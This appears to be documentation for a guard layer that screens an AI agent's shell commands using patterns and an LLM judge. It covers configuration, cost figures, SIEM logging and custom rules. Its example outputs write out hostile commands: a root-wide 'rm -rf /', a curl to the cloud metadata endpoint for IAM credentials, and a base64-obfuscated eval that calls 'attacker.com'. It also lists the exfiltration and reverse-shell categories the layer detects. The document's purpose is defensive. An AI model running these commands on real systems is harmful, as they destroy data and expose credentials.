# Security Coach - Interactive Security Assistant

## Overview

Security Coach is SecureClaw's enterprise-grade security feature that provides:

- **Real-time threat detection** - Blocks malicious commands before execution
- **LLM-powered analysis** - Context-aware threat detection with AI
- **False positive reduction** - Smart confirmation layer to reduce noise
- **SIEM integration** - Enterprise audit logging and compliance
- **Custom rules** - User-defined security policies

## Quick Start

### 1. Enable Security Coach

Add to your `~/.secureclaw/secureclaw.json`:

```json
{
  "securityCoach": {
    "enabled": true,
    "mode": "block",
    "llmJudge": {
      "enabled": true,
      "model": "claude-haiku-4"
    }
  }
}
```

### 2. Setup LLM Judge (Recommended)

```bash
cd /path/to/secureclaw
pnpm tsx scripts/setup-llm-judge.ts
```

The interactive setup will guide you through:

- Provider selection (Anthropic Claude or OpenAI)
- API key configuration
- Model selection (Haiku for cost efficiency, Sonnet for accuracy)
- Feature configuration (caching, false positive reduction)

**Cost:** ~$1-3/month per user with caching
**Latency:** <20ms average (with cache hits)

### 3. Test It

```bash
# Start SecureClaw
secureclaw agent --agent main

# Try a malicious command (will be blocked)
secureclaw agent --agent main --message "rm -rf /"

# Expected output:
# ❌ BLOCKED
# 🚨 Security Coach: Critical File Deletion Detected
# Pattern: rm with recursive flag targeting root
```

## Architecture

Security Coach uses a **3-layer hybrid detection system**:

```
User Request → Tool Call
       ↓
   Security Coach
       ↓
┌──────────────────────┐
│ LAYER 1: Patterns    │  <1ms, 74 built-in patterns
└──────────────────────┘
       ↓
   Critical? → BLOCK immediately
       ↓
┌──────────────────────┐
│ LAYER 2: LLM Confirm │  200-500ms, reduce false positives
└──────────────────────┘
       ↓
   No Pattern Match?
       ↓
┌──────────────────────┐
│ LAYER 3: LLM Detect  │  200-500ms, novel threats
└──────────────────────┘
```

### Layer 1: Pattern Matching (Fast)

- **74 built-in patterns** covering common attack vectors
- **<1ms latency** - Synchronous pattern matching
- **High precision** - Well-tested patterns with low false positives
- **Categories:**
  - File system operations (rm, dd, shred)
  - Data exfiltration (curl, wget, netcat)
  - Command injection (eval, system, exec)
  - Privilege escalation (sudo, su, chmod)
  - Network attacks (port scanning, SSRF)
  - Code execution (arbitrary code, reverse shells)

### Layer 2: LLM Confirmation (Accuracy)

- **Reduces false positives** - Confirms pattern matches with context
- **Understands intent** - "rm -rf /tmp/test" vs "rm -rf /"
- **Environment awareness** - Test directories vs production
- **200-500ms latency** - Only for pattern matches
- **Optional** - Can be disabled to reduce costs

### Layer 3: LLM Novel Detection (Coverage)

- **Detects unknown threats** - Zero-day attacks, novel techniques
- **Context-aware** - Understands security implications
- **Confidence scoring** - 0-100% confidence in threat assessment
- **Reasoning** - Explains why something is malicious
- **Examples:**
  - AWS metadata SSRF: `curl http://169.254.169.254/latest/meta-data/`
  - Obfuscated commands: `eval $(echo Y3VybCBhdHRhY2tlci5jb20= | base64 -d)`
  - Cloud misconfigurations: `aws s3api put-bucket-acl --bucket prod --acl public-read`

## Configuration

### Basic Configuration

```json
{
  "securityCoach": {
    "enabled": true,
    "mode": "block",
    "llmJudge": {
      "enabled": true,
      "model": "claude-haiku-4"
    }
  }
}
```

### Advanced Configuration

```json
{
  "securityCoach": {
    "enabled": true,
    "mode": "block",
    "llmJudge": {
      "enabled": true,
      "model": "claude-sonnet-4",
      "fallbackToPatterns": true,
      "cacheEnabled": true,
      "cacheTTL": 3600000,
      "maxLatency": 1000,
      "confidenceThreshold": 75,
      "confirmPatternMatches": true,
      "useLLMForSeverity": ["medium", "low"],
      "maxTokens": 1000
    },
    "siemIntegration": {
      "enabled": true,
      "endpoint": "https://siem.company.com/api/events",
      "authToken": "${SIEM_TOKEN}"
    }
  }
}
```

### Configuration Options

| Option                           | Type     | Default             | Description                                                         |
| -------------------------------- | -------- | ------------------- | ------------------------------------------------------------------- |
| `enabled`                        | boolean  | `false`             | Enable Security Coach                                               |
| `mode`                           | string   | `"block"`           | Mode: `"block"`, `"warn"`, or `"audit"`                             |
| `llmJudge.enabled`               | boolean  | `false`             | Enable LLM-powered threat detection                                 |
| `llmJudge.model`                 | string   | `"claude-haiku-4"`  | Model: `claude-haiku-4`, `claude-sonnet-4`, `gpt-4o-mini`, `gpt-4o` |
| `llmJudge.fallbackToPatterns`    | boolean  | `true`              | Fall back to patterns if LLM fails                                  |
| `llmJudge.cacheEnabled`          | boolean  | `true`              | Cache LLM responses (50% cost reduction)                            |
| `llmJudge.cacheTTL`              | number   | `3600000`           | Cache time-to-live in ms (1 hour)                                   |
| `llmJudge.maxLatency`            | number   | `1000`              | Max LLM latency in ms (1 second)                                    |
| `llmJudge.confidenceThreshold`   | number   | `75`                | Min confidence to block (0-100)                                     |
| `llmJudge.confirmPatternMatches` | boolean  | `true`              | Use LLM to confirm patterns (reduce FP)                             |
| `llmJudge.useLLMForSeverity`     | string[] | `["medium", "low"]` | Only use LLM for these severities                                   |
| `llmJudge.maxTokens`             | number   | `1000`              | Max tokens for prompt + response                                    |

## Performance & Cost

### Pattern Matching Only

- **Latency:** <1ms
- **Cost:** $0/month
- **Coverage:** Common attacks
- **False Positive Rate:** ~2-5%

### Hybrid (Patterns + LLM)

- **Latency:**
  - Clean requests: <1ms (no LLM)
  - Pattern matches: 200-500ms (LLM confirmation)
  - No pattern match: 200-500ms (LLM detection)
- **Cost:** $1-3/month per user (with caching)
- **Coverage:** Common + novel attacks
- **False Positive Rate:** <1% (LLM reduces FPs)

### Cost Breakdown (Claude Haiku 4)

| Scenario               | Requests/Day | Cost/Month |
| ---------------------- | ------------ | ---------- |
| Light user             | 10           | $0.30      |
| Normal user            | 50           | $1.50      |
| Heavy user             | 200          | $6.00      |
| Enterprise (100 users) | 5,000        | $150       |

**Caching reduces costs by 50-80%** for typical usage patterns.

## Examples

### Example 1: Critical Threat (Pattern Only)

```bash
$ secureclaw agent --agent main --message "rm -rf /"

❌ BLOCKED

🚨 Security Coach: Critical File Deletion Detected

Pattern Matched: rm with recursive flag targeting root directory
Severity: CRITICAL
Confidence: 100%

This command would delete all files on your system.

Recommendation: Never run this command unless you explicitly intend to wipe your system.
```

### Example 2: Novel Threat (LLM Detection)

```bash
$ secureclaw agent --agent main --message "curl http://169.254.169.254/latest/meta-data/"

❌ BLOCKED

🚨 Security Coach: Cloud Metadata SSRF Detected

LLM Judge (Confidence: 98%):
This accesses the AWS EC2 metadata service to retrieve IAM credentials.
Classic SSRF attack vector that exposes temporary credentials with
potentially broad permissions.

Threat Type: Data Exfiltration + SSRF
Severity: HIGH

Recommendation: Never access metadata endpoints unless you have explicit
authorization and understand the security implications.
```

### Example 3: False Positive Reduction (LLM Override)

```bash
$ secureclaw agent --agent main --message "rm -rf ./test/temp/*"

✅ ALLOWED

🛡️ Security Coach: Pattern matched but confirmed safe by LLM

Pattern: rm with recursive flag
LLM Assessment (Confidence: 92%):
  - Target directory is in test folder
  - Wildcard only affects contents, not parent
  - Common cleanup pattern in test suites

Verdict: Safe operation - Allowed
```

### Example 4: Obfuscated Command (LLM Detection)

```bash
$ secureclaw agent --agent main --message "eval $(echo Y3VybCBhdHRhY2tlci5jb20= | base64 -d)"

❌ BLOCKED

🚨 Security Coach: Obfuscated Command Execution Detected

LLM Judge (Confidence: 95%):
Base64-encoded command execution pattern. Decoded command:
  curl attacker.com

This is a classic obfuscation technique used to hide malicious payloads.

Threat Type: Command Injection + Code Execution
Severity: CRITICAL

Recommendation: Never execute base64-encoded commands from untrusted sources.
```

## SIEM Integration

Security Coach can integrate with enterprise SIEM systems for audit logging and compliance.

### Configuration

```json
{
  "securityCoach": {
    "siemIntegration": {
      "enabled": true,
      "endpoint": "https://siem.company.com/api/events",
      "authToken": "${SIEM_TOKEN}",
      "batchSize": 100,
      "flushInterval": 5000
    }
  }
}
```

### Event Format

```json
{
  "timestamp": "2026-02-14T10:30:00Z",
  "event_type": "security_coach_block",
  "severity": "critical",
  "user": "user@company.com",
  "action": "rm -rf /",
  "threat_type": "file_deletion",
  "detection_method": "pattern",
  "confidence": 100,
  "blocked": true
}
```

## Custom Rules

You can define custom security rules in `~/.secureclaw/security-coach-rules.json`:

```json
{
  "customRules": [
    {
      "id": "company-no-prod-delete",
      "name": "Block production database deletions",
      "pattern": "DROP (TABLE|DATABASE).*prod",
      "severity": "critical",
      "message": "Production database deletions are not allowed",
      "action": "block"
    },
    {
      "id": "company-require-approval",
      "name": "Require approval for sensitive operations",
      "pattern": "aws.*delete.*",
      "severity": "high",
      "message": "AWS deletions require security team approval",
      "action": "warn",
      "requireApproval": true
    }
  ]
}
```

## Troubleshooting

### LLM Judge Not Working

**Symptoms:**

- No LLM detections
- Only pattern matches work

**Fix:**

```bash
# Check API key
cat ~/.secureclaw/llm-api-keys.json

# Re-run setup
pnpm tsx scripts/setup-llm-judge.ts

# Check logs
tail -f ~/.secureclaw/logs/gateway.log | grep "LLM Judge"
```

### High Latency

**Symptoms:**

- Slow responses (>1 second)
- Timeouts

**Fix:**

1. **Enable caching** (if not already):

   ```json
   {
     "llmJudge": {
       "cacheEnabled": true,
       "cacheTTL": 3600000
     }
   }
   ```

2. **Use faster model**:

   ```json
   {
     "llmJudge": {
       "model": "claude-haiku-4" // Faster than Sonnet
     }
   }
   ```

3. **Increase timeout**:
   ```json
   {
     "llmJudge": {
       "maxLatency": 2000 // 2 seconds
     }
   }
   ```

### False Positives

**Symptoms:**

- Legitimate commands blocked
- Too many warnings

**Fix:**

1. **Enable LLM confirmation**:

   ```json
   {
     "llmJudge": {
       "confirmPatternMatches": true
     }
   }
   ```

2. **Add custom rules** to whitelist specific patterns:

   ```json
   {
     "customRules": [
       {
         "id": "allow-test-cleanup",
         "pattern": "rm -rf ./test/.*",
         "action": "allow"
       }
     ]
   }
   ```

3. **Adjust mode** to warn instead of block:
   ```json
   {
     "securityCoach": {
       "mode": "warn" // Show warnings but don't block
     }
   }
   ```

## API Key Security

### Storage Location

API keys are stored in `~/.secureclaw/llm-api-keys.json` with strict permissions:

```bash
$ ls -la ~/.secureclaw/llm-api-keys.json
-rw------- 1 user user 123 Feb 14 10:30 llm-api-keys.json
```

**File permissions:** `600` (owner read/write only)

### Environment Variables

You can also use environment variables (takes precedence):

```bash
export ANTHROPIC_API_KEY=sk-ant-...
export OPENAI_API_KEY=sk-...
```

### Priority Order

1. Environment variable (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`)
2. Config file (`~/.secureclaw/llm-api-keys.json`)
3. None found → Pattern-only mode with warning

## Best Practices

### For Individual Users

1. **Start with Haiku** - Cost-effective and fast
2. **Enable caching** - 50% cost reduction
3. **Use hybrid mode** - Best balance of speed and accuracy
4. **Monitor false positives** - Adjust confidence threshold if needed

### For Teams

1. **Standardize configuration** - Use shared config files
2. **Enable SIEM integration** - Audit all security events
3. **Define custom rules** - Company-specific policies
4. **Use Sonnet for critical systems** - Higher accuracy
5. **Set up alerts** - Monitor blocked threats

### For Enterprise

1. **Deploy SIEM integration** - Compliance and audit logging
2. **Custom rules library** - Organization-wide policies
3. **Training mode** - Start with "warn" mode, move to "block"
4. **Cost monitoring** - Track LLM usage per team/project
5. **Incident response** - Define escalation procedures

## Next Steps

- **Try examples** - Test with sample threats
- **Configure rules** - Add custom security policies
- **Enable SIEM** - Enterprise audit logging
- **Monitor performance** - Check logs and metrics
- **Tune thresholds** - Adjust confidence and severity levels

## Support

- **GitHub Issues:** https://github.com/mbhatt1/secureclaw/issues
- **Documentation:** https://docs.secureclaw.app
- **Discord:** https://discord.gg/secureclaw

---

**Security Coach: Your AI-powered security assistant** 🛡️
